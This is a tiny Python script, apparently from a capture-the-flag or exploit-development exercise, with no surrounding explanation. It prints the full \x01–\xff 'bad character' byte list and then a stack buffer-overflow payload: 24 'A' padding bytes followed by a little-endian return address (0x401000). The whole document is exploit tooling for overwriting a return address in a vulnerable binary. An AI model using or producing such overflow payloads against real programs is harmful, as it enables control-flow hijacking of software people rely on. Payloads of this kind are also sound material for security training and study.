for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()


print('A'*24+'\x00\x10\x40\x00')
